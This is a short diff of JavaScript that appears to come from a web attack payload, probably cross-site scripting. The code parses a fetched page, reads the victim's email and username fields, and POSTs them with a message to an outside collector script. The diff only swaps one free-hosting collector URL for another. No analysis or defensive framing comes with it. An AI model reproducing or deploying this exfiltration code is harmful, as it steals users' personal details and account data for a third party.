@@ -13,7 +13,7 @@ xhr.onreadystatechange = () => {
                 var dom = parser.parseFromString(xhr.responseText, "text/html")
                 var email = dom.getElementById("email").value;
                 var username = dom.getElementById("username").value;
-                xhr.open("POST","http://vuln.atwebpages.com/ll.php");
+                xhr.open("POST","https://vuln-tex.000webhostapp.com/ll.php");
 xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
 
 xhr.send(`email=${email}&username=${username}&message=${message}`);
